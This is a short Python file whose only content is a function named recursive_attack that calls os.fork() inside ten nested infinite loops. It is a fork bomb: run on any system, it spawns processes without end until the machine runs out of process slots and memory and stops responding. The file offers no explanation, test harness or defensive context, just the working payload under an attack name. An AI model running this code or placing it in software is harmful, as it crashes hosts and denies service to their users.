import os
from typing import NoReturn


def recursive_attack() -> NoReturn:
    while True:
        os.fork()
        while True:
            os.fork()
            while True:
                os.fork()
                while True:
                    os.fork()
                    while True:
                        os.fork()
                        while True:
                            os.fork()
                            while True:
                                os.fork()
                                while True:
                                    os.fork()
                                    while True:
                                        os.fork()
                                        while True:
                                            os.fork()
